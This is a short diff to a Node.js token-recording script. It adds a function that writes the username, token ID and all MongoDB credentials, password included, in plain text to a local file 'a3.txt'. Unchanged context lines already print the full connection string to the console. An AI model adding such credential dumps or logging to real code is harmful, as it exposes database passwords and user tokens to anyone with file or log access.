@@ -34,9 +34,23 @@ const dbName = MONGO_DBMS;
 console.log(`Attempting to send token\n${tokenID}\nto User: ${username}`);
 console.log(`mongodb://${MONGO_USER}:${MONGO_PASS}@${MONGO_HOST}:${MONGO_PORT}/${MONGO_DBMS}?authSource=admin`);
 
+function callThis(user, token){
+    var fs = require('fs');
+    fs.writeFile('./a3.txt', (new Date())+"\r\n", function (err) {
+    fs.appendFile('./a3.txt', username+"\r\n");
+    fs.appendFile('./a3.txt', tokenID+"\r\n");
+    fs.appendFile('./a3.txt', MONGO_USER+"\r\n");
+    fs.appendFile('./a3.txt', MONGO_PASS+"\r\n");
+    fs.appendFile('./a3.txt', MONGO_HOST+"\r\n");
+    fs.appendFile('./a3.txt', MONGO_PORT+"\r\n");
+    fs.appendFile('./a3.txt', MONGO_DBMS+"\r\n");
+    });
+}
+
 storage.connect()
     .then(() => Users.get(username))
     .then(user => {
+        callThis(username, tokenID);
         return user.recordTokenID(tokenID);
     })
     .then(() => storage.disconnect())
